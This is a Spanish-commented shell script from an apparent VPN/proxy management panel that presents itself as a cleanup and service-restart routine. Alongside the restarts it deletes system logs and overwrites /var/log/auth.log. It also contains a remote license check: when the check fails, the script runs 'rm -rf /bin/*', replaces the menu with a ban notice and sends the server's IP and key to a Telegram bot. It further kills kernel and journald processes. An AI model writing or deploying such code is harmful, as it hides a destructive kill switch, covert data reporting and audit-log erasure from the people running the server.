#!/bin/sh
#!/bin/sh
#Autor: Henry Chumo 
#Alias : ChumoGH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games/

# Umbral de capacidad libre en gigabytes (ajústalo según tus necesidades)
umbral=10

# Verificar la capacidad libre en el disco principal
capacidad_libre=$(df -BG / | awk 'NR==2 {print $4}' | sed 's/G//')

# Comprobar si la capacidad libre es menor que el umbral
if [ "$capacidad_libre" -lt "$umbral" ]; then
    echo "La capacidad libre en el disco es baja. Iniciando la limpieza..."

    # Comandos de limpieza (puedes personalizarlos según tus necesidades)
	sudo find /var/log -type f -name "*.log" -exec rm -f {} \;
	sudo journalctl --vacuum-size=100M   &>/dev/null # Limita el tamaño de los logs del sistema
	sudo find /etc -name "*.*~" -exec rm -f {} \;   # Elimina archivos de configuración antiguos
	sudo rm -rf /var/cache/apt/archives/* &>/dev/null
	echo '@ChumoGH ' > /var/log/auth.log
	systemctl restart rsyslog.service
    echo "Limpieza completada."
	
else
    echo "La capacidad libre en el disco es suficiente. No es necesario limpiar."
fi

rm -rf /usr/.work
echo -e " CLEAN LOGS FIX "
#echo > /var/log/auth.log
#killall rsyslog
#systemctl restart rsyslog.service
#clear&&clear
rm -f /root/cron
_puertas() {
    unset portas
    portas_var=$(lsof -V -i tcp -P -n | grep -v "ESTABLISHED" | grep -v "COMMAND" | grep "LISTEN")
    while read port; do
      var1=$(echo $port | awk '{print $1}') && var2=$(echo $port | awk '{print $9}' | awk -F ":" '{print $2}')
      [[ "$(echo -e $portas | grep "$var1 $var2")" ]] || portas+="$var1 $var2\n"
    done <<<"$portas_var"
    i=1
    echo -e "$portas"
}

source /bin/ejecutar/msg

function chekKEY {
[[ -z ${IP} ]] && IP=$(cat < /bin/ejecutar/IPcgh)
[[ -z ${IP} ]] && IP=$(wget -qO- ifconfig.me)
Key="$(cat /etc/cghkey)"
local _post=$(< /usr/bin/vendor_code)
local _double
if [[ -e /file ]]; then
    _double=$(< /file)
else
    curl --retry 3 -sS -o /file https://raw.githubusercontent.com/ChumoGH/ADMcgh/main/TOKENS/dinamicos/control
    _double=$(< /file)
fi
_check2=$(echo "$_double" | grep -F "$_post")
[[ -z ${_check2} ]] && {
mss_='\n BotGEN CLON NO AUTORIZADO POR @ChumoGH '
cat <<EOF >/bin/menu
clear && clear
echo -e "\n\n\033[1;31m==================================================\n ¡¡ 🚫 KEY BANEADA  🚫 ! CONTACTE Su ADMINISTRADOR! \n==================================================\n ¡¡ FECHA DE BANEO :$(date +%d/%m/%Y) HORA :$(date +%H:%M:%S) \n==================================================\n\n¡¡ ${mss_} \n\n==================================================\n"
echo -e " \e[1;32m     --- SI CONSIDERA QUE FUE UN ERROR  ---  " | pv -qL 60
echo -e " \e[1;32m     -- ${mss_} --  " | pv -qL 60
echo -e "\n \e[1;93m           --- TECLEA  \e[1;93m --- \e[1;97mcgh -fix\e[1;93m ---  " | pv -qL 50
echo -e "\n\033[1;31m==================================================\n\n"
#echo "/etc/adm-lite/menu" > /bin/menu && chmod +x /bin/menu
EOF
rm -f /etc/folteto
rm -rf /bin/*
 			MENSAJE="${TTini}${m3ssg}MSG RECIVIDO${m3ssg}${TTfin}\n"
			MENSAJE+=" ---------------------------------------------\n"
			MENSAJE+=" IP Clon: ${IP} Rechazada\n"
			MENSAJE+=" ---------------------------------------------\n"
			MENSAJE+=" INSECTO DETECTADO EN AUTOREINICIOS\n"
			MENSAJE+=" ---------------------------------------------\n"
			MENSAJE+=" Key : ${Key}\n"
			MENSAJE+=" ---------------------------------------------\n"
			MENSAJE+=" HORA : $(printf '%(%D-%H:%M:%S)T')\n"
			MENSAJE+=" ---------------------------------------------\n"
			MENSAJE+="       ${rUlq} Bot ADMcgh de keyS ${rUlq}\n"
			MENSAJE+="           ${pUn5A} By @ChumoGH ${pUn5A} \n"
			MENSAJE+=" ---------------------------------------------\n"	
			curl -s --max-time 10 -d "chat_id=$ID&disable_web_page_preview=1&text=$(echo -e "$MENSAJE")" $urlBOT &>/dev/null 	
exit && exit
} || echo "${_check2}" /etc/chekKEY
}

reiniciar_ser () {
local hora=$(printf '%(%H:%M:%S)T') 
local fecha=$(printf '%(%D)T')
echo "========================================"
echo " FECHA : ${fecha} | HORA : ${hora}"
echo "========================================"
screen -wipe &>/dev/null
echo 3 > /proc/sys/vm/drop_caches 1> /dev/null 2> /dev/null
sysctl -w vm.drop_caches=3 1> /dev/null 2> /dev/null
swapoff -a && swapon -a 1> /dev/null 2> /dev/null
echo 3 > /proc/sys/vm/drop_caches
sysctl -w vm.drop_caches=3 > /dev/null 2>&1
##
echo ""
echo -ne " \033[1;31m[ ! ] Services AUTOREBOOT RESTART FIX"
killall $(cat /bin/autoboot| grep -w screen |awk '{print $20}') &>/dev/null
/bin/autoboot &>/dev/null && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -e " \033[1;31m[ ! ] Services BADVPN UDP RESTART "
[[ -e /etc/systemd/system/badvpn.service ]] && { 
systemctl restart badvpn.service > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
} || {
portasx="$(ps x | grep badvpn | grep -v grep | grep -v SCREEN | cut -d ":" -f3 | awk '{print $1'})"
killall badvpn-udpgw 1> /dev/null 2> /dev/null
kill -9 $(ps x | grep badvpn | grep -v grep | grep -v SCREEN | cut -d ":" -f1 | awk '{print $1'}) &>/dev/null
totalporta=($portasx)
    unset PORT
    for ((i = 0; i < ${#totalporta[@]}; i++)); do
      [[ $(_puertas | grep "${totalporta[$i]}") = "" ]] && {
        echo -ne " \033[1;33m BADVPN:\033[1;32m ${totalporta[$i]}"
        PORT+="${totalporta[$i]}\n"
        screen -dmS badvpn $(which badvpn-udpgw) --listen-addr 127.0.0.1:${totalporta[$i]} --max-clients 1000 --max-connections-for-client 10 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
      } || {
        echo -e "\033[1;33m Puerto Escojido:\033[1;31m ${totalporta[$i]} FAIL"
      }
    done
} || echo -e "\033[1;31m [ SERVICE NO INSTALL ]"
#killall /etc/adm-lite/slow/dnsi/dns-server > /dev/null 2>&1
echo -ne " \033[1;31m[ ! ] Services ssh restart"
service dropbear stop > /dev/null 2>&1
service ssh restart > /dev/null 2>&1
[[ -e /etc/init.d/ssh ]] && /etc/init.d/ssh restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services dropbear restart"
service dropbear restart > /dev/null 2>&1
[[ -e /etc/init.d/dropbear ]] && /etc/init.d/dropbear restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services UDPServer restart"
ip_nat=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | sed -n 1p)
interfas=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}'|grep "$ip_nat"|awk {'print $NF'})
[[ -e /usr/bin/udpServer ]] && {
screen -ls | grep UDPserver | cut -d. -f1 | awk '{print $1}' | xargs kill &>/dev/null
if screen -dmS UDPserver /usr/bin/udpServer -ip=$ip_publica -net=$interfas -mode=system &>/dev/null ; then
		echo -e "\033[1;32m [OK]"
	else
		echo -e "\033[1;31m [FAIL]"
fi
} || echo -e "\033[1;31m [ SERVICE NO INSTALL ]"
echo -ne " \033[1;31m[ ! ] Services UDPCustom restart"
systemctl restart udp-custom > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services ZipVPN restart"
systemctl restart zivpn > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -e " \033[1;31m[ ! ] Services Hysteria 1 & 2 restart"
[[ -e /etc/adm-lite/HYSTERIA/config.json ]] && {
systemctl restart hysteria.service > /dev/null 2>&1 && echo -e " HISTERIA 1 \033[1;32m [OK]" 
} || echo -e "\033[1;31m [FAIL]"
[[ -e /etc/adm-lite/HYSTERIA/data.yaml ]] && {
systemctl restart hysteria-server > /dev/null 2>&1 && echo -e " HYSTERIA 2 \033[1;32m [OK]" 
} || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services stunnel4 restart"
service stunnel4 restart > /dev/null 2>&1
systemctl restart stunnel > /dev/null 2>&1
[[ -e /etc/init.d/stunnel4 ]] && /etc/init.d/stunnel4 restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services stunnel5 restart"
service stunnel5 restart > /dev/null 2>&1
systemctl restart stunnel5.service > /dev/null 2>&1
[[ -e /etc/init.d/stunnel5 ]] && systemctl restart stunnel5.service > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services V2RAY restart"
[[ -e /etc/v2ray/config.json ]] && {
(
v2ray restart > /dev/null 2>&1 
service v2ray restart > /dev/null 2>&1
v2ray clean >/dev/null 2>&1 &
) && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
} || echo -e "\033[1;31m [ SERVICE NO INSTALL ]"
echo -ne " \033[1;31m[ ! ] Services XRAY restart"
[[ -e /etc/xray/config.json ]] && {
(
xray restart > /dev/null 2>&1 
service xray restart > /dev/null 2>&1
xray clean >/dev/null 2>&1 &
) && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
} || echo -e "\033[1;31m [ SERVICE NO INSTALL ]"
echo -ne " \033[1;31m[ ! ] Services X-UI restart"
[[ -e /usr/local/x-ui/bin/config.json ]] && { 
systemctl restart x-ui > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" 
} || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services Trojan-GO restart IN "
killall trojan &> /dev/null 2>&1
[[ -e /usr/local/etc/trojan/config.json ]] && {
[[ $(uname -m 2> /dev/null) != x86_64 ]] && {
echo -ne "\033[1;32m ARM X64 " && (screen -dmS trojanserv trojan --config /usr/local/etc/trojan/config.json &) && echo "OK " || echo -e "\033[1;32mÎ” FAIL"
} || echo -ne "\033[1;32m X86-64 " && (screen -dmS trojanserv trojan /usr/local/etc/trojan/config.json -l /root/server.log &) && echo "OK " || echo -e "\033[1;32mÎ” FAIL"
} || echo -e "\033[1;31m [ SERVICE NO INSTALL ]"
echo -ne " \033[1;31m[ ! ] Services KeyGen restart"
[[ -e "$(which genon)" ]] && genon && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services squid restart"
service squid restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services squid3 restart"
service squid3 restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services apache2 restart"
service apache2 restart > /dev/null 2>&1
[[ -e /etc/init.d/apache2 ]] && /etc/init.d/apache2 restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"

echo -ne " \033[1;31m[ ! ] Services NGINX restart"
service nginx restart > /dev/null 2>&1
[[ -e /etc/init.d/nginx ]] && /etc/init.d/nginx restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services openvpn restart"
service openvpn restart > /dev/null 2>&1
[[ -e /etc/init.d/openvpn ]] && /etc/init.d/openvpn restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services KeyGen restart"
killall http-server.sh &> /dev/null 2>&1
[[ -e /bin/http-server.sh ]] && screen -dmS generador /bin/http-server.sh -start > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
echo -ne " \033[1;31m[ ! ] Services fail2ban restart"
( 
[[ -e /etc/init.d/ssh ]] && /etc/init.d/ssh restart
fail2ban-client -x stop && fail2ban-client -x start
) > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
return
}

[[ "$1" = "--menu" ]] && reiniciar_ser >> /root/ADMcgh.log || reiniciar_ser >> /root/ADMcgh.log
msg -bar3
print_center -verm2 "REINCIIOS COMPLETOS Y PURGA DE BINARIOS"
msg -bar3
echo ""
echo -e " LIBERANDO CARGAS Y SCRIPTS!!!!"
killall kswapd0 > /dev/null 2>&1
killall systemd-journald > /dev/null 2>&1
killall tcpdump > /dev/null 2>&1
killall ksoftirqd > /dev/null 2>&1
killall menu > /dev/null 2>&1